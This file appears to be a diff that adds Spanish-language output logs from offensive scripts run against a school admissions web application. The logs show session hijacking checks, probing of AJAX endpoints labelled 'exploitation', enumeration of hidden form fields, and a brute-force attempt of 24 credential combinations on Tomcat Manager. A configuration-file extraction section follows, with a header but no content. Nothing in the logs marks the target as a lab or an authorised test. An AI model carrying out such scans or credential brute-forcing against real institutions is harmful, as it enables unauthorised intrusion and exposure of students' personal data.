@@ -1,0 +1,53 @@
+SCRIPT MEJORADO: EXPLOTACIÓN DIRIGIDA:
+
+[+] Sesión configurada: 3B0DDD39CD0068BB30ED28B8C75B2A38
+[+] Verificando acceso de sesión...
+  /jsp/index.jsp - Status: 200 - Tamaño: 1750 bytes
+  /jsp/escolar/proceso_admision/proceso_interesado.jsp - Status: 200 - Tamaño: 38586 bytes
+  /jsp/cerrar_sesion.jsp - Status: 200 - Tamaño: 1808 bytes
+
+[+] Explotando endpoints AJAX...
+
+  🔍 Probando: /jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp
+    Normal request: 200 - 29 bytes
+    Respuesta:
+
+
+1¬INSTITUTO OCTAVIO PAZ...
+
+  🔍 Probando: /jsp/escolar/muestra_bachillerato_ajax.jsp
+    Normal request: 200 - 29 bytes
+    Respuesta:
+
+
+1,INSTITUTO OCTAVIO PAZ...
+
+[+] Buscando endpoints ocultos...
+
+[+] Analizando formularios...
+  📋 Formularios encontrados: 1
+    Formulario 1:
+      Method: post
+      🔒 Hidden: yAccion =
+      🔒 Hidden: yInteresado = 0
+      🔒 Hidden: yEncuestado = 0
+      🔒 Hidden: yCveTipoSeguroOtro = 10
+      🔒 Hidden: yResolucion = 800x600
+      🔒 Hidden: ySexo = M
+      🔒 Hidden: yObjeto = sin valor
+      🔒 Hidden: yScroll =
+      🔒 Hidden: yBloqueoG = true
+      🔒 Hidden: yMenorEdad = 1
+
+🎯 EXPLOTACIÓN COMPLETADA!
+
+SCRIPT DE FUERZA BRUTA MEJORADO PARA TOMCAT MANAGER:
+
+=== FUERZA BRUTA AVANZADA TOMCAT MANAGER ===
+Probando 24 combinaciones...
+❌ No se encontraron credenciales válidas
+
+[+] Probando configuraciones por defecto...
+
+SCRIPT DE EXTRACCIÓN DE ARCHIVOS DE CONFIGURACIÓN:
+
